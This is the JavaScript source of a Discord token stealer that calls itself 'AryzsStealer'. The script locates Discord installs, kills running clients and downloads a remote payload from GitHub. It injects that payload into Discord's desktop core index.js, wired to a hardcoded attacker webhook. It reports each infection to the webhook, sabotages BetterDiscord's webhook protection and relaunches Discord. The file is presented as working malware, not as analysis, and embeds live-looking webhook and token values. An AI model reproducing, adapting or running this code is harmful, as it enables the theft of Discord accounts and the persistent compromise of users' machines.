np

const glob = require("glob");
const fs = require('fs');
const https = require('node:https');
const { exec } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "https://discord.com/api/webhooks/990106451324338237/mSg2aHrG-nhssCvVI5HJRH-Fg8nrLKD-S64nort9IORlH4QretOi-aAvBaeZQFwfNcjS";
const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify":"true",
    "embed-color": "3092790",
    "disable-qr-code": "true"
}
let LOCAL = process.env.LOCALAPPDATA
let discords = [];
let injectPath = [];
let runningDiscords = [];

fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
	console.log("File: " + LOCAL + '\\' + file);
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});


function Infect() {
    https.get('https://raw.githubusercontent.com/haxdeveloper/Aryzs-Injection/main/aryzsminified.js?token=GHSAT0AAAAAABTTSWAJWYEPF32M7SU7VGGGYVWRLCQ', (resp) => {
        let data = '';

        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
	    injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });

                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }

                if ( config.logout != "false" ) {
                    let folder = file.replace("index.js", "AryzsStealer_BTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};

function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
        if (stdout.includes("DiscordCanary.exe")) console.log("Discord Canary Running"); runningDiscords.push("discordcanary");
        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
        if (stdout.includes("Powercord.exe")) runningDiscords.push("powercord");

        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
		console.log("Notifying.");
            }
            Infect()
            pwnBetterDiscord()
        }
    })
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        console.log("Killing: " + disc);
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
        });
    });

    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
	console.log("Updater: " + path);
        exec(path, (err) => {
            if (err) {
              return;
            }
        });
    });
};

function pwnBetterDiscord() {
    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        let x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "haxisgod"))
    }

    return;
}

function injectNotify() {
    let fields = [];
    injectPath.forEach( path => {
        let c = {
            name: "Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": "Successfully injected.",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "AryzsStealer"
            },
            "footer": {
              "text": "AryzsStealer"
            }
          }
        ]
      })
	.then(res => {

	})
	.catch(error => {

    })
}

function getDirectories(path) {
  return fs.readdirSync(path).filter(function (file) {
    return fs.statSync(path+'/'+file).isDirectory();
  });
}


listDiscords();
discords.forEach(function(file) {
    getDirectories(file + "\\").forEach((item) => {
        if (item.includes("app-")) {
          file = file + "\\" + item + "\\modules\\";
        }
    });
    getDirectories(file).forEach((item) => {
        if (item.includes("discord_desktop_core-")) {
          file = file + "\\" + item + "\\discord_desktop_core\\index.js";
        }
    });

    if (fs.existsSync(file)) {
      injectPath.push(file);
    }
});
killDiscord();
Infect();
startDiscord();